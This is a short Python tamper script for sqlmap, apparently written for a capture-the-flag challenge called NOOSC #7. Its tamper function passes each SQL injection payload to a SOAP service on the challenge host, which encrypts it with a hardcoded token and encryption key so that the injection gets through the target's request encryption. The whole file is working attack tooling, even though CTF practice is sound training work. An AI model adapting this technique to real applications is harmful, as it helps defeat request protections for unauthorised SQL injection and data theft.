#!/usr/bin/env python

"""
NOOSC #7 SQL Injection Tamper (sqlmap tamper script)

By Indra BW
"""

from lib.core.enums import PRIORITY
from SOAPpy import WSDL

__priority__ = PRIORITY.LOWEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    encrypt request
    """
    retval = ""
    wsdlFile = 'http://fx72657.ctf.noosc.co.id:8080/?wsdl'
    server = WSDL.Proxy(wsdlFile)

    data = {'Token': 'MTM5NDA5NzAyM0xEM3dxZ0JxZzRFRFBWTUVDdnR4QWhwQXR6THpQQkZ0', 'Encryptionkey': '618d78aa080b8415725149cd2170436f'}

    if payload:
        encrequest = server.EncryptRequest(payload, data['Encryptionkey'])
        retval = encrequest

    return retval if payload else payload
